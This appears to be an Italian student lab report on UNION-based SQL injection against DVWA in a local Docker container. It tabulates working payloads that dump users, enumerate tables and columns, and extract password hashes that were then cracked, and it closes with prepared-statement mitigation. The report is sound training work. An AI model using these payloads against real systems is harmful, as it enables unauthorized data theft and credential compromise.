# 🔐 DVWA SQL Injection Lab Report
**Date:** Maggio 2026  Leonardo Sorrentini
**Environment:** Kali Linux (Docker) | DVWA | Security Level: Low  

---

## 🎯 Obiettivo
Comprendere e dimostrare il meccanismo di vulnerabilità **SQL Injection (UNION-based)** in un ambiente controllato e legale, documentando payload, impatti e contromisure di sviluppo sicuro.

---

## 🛠️ Configurazione Ambiente
- **OS:** Kali Linux (Rolling)
- **Container:** `docker run --rm -d -p 80:80 vulnerables/web-dvwa`
- **Accesso:** `http://127.0.0.1` | Credenziali: `admin` / `password`
- **Sicurezza:** Rete isolata, nessuna esposizione pubblica, uso conforme a linee guida etiche di penetration testing.

---

## 💉 Analisi Payload & Comportamento

| Payload | Output Osservato | Spiegazione Tecnica |
| :--- | :--- | :--- |
| `1` | `First name: admin \| Surname: admin` | Query legittima: `SELECT first_name, last_name FROM users WHERE user_id = '1'` |
| `' OR '1'='1` | Dump completo di tutti gli utenti | Tautologia SQL: `WHERE user_id = '' OR TRUE` forza il DB a restituire ogni riga |
| `1' UNION SELECT version(), database()#` | Versione DB + Nome DB (`dvwa`) | `UNION` combina risultati. `#` commenta il resto della query originale. |
| `1' UNION SELECT null, table_name FROM information_schema.tables#` | Lista tabelle (`users`, `guestbook`, ecc.) | Interrogazione del dizionario dati `information_schema`. `null` allinea le colonne. |
| `1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'#` | Colonne tabella `users` | Filtro sul dizionario per estrarre struttura della tabella target. |
| `1' UNION SELECT user, password FROM users#` | Username + Hash MD5 delle password | Mappatura diretta sui campi visualizzati. Estrazione dati sensibili. |
|#Verficato Hash risultato su crackstation.net e con cmd hashcat su Kali.

---

## 🔍 Note Tecniche Critiche
- **Allineamento Colonne:** `UNION` richiede lo stesso numero di colonne della query originale (2). L'uso di `null` è pratica standard per il padding.
- **Commento SQL (`#` o `-- `):** Essenziale per neutralizzare la chiusura della stringa iniettata dal backend, evitando errori di sintassi.
- **Impatto sulla Sicurezza:** L'estrazione di hash MD5 dimostra il rischio di esposizione dati. Hash deboli sono crackabili in pochi secondi con tool pubblici.
- **Mitigazione (Livello `Impossible`):** Utilizzo di **Prepared Statements (PDO)**. Il motore SQL separa struttura e dati, rendendo l'iniezione strutturalmente impossibile.

---
"Tutte le attività documentate sono state eseguite esclusivamente su infrastruttura containerizzata isolata di proprietà. Nessun accesso, modifica o esposizione di sistemi o dati di terzi. Scopo puramente formativo, conforme alle linee guida OWASP e alla normativa vigente in materia di cybersecurity."

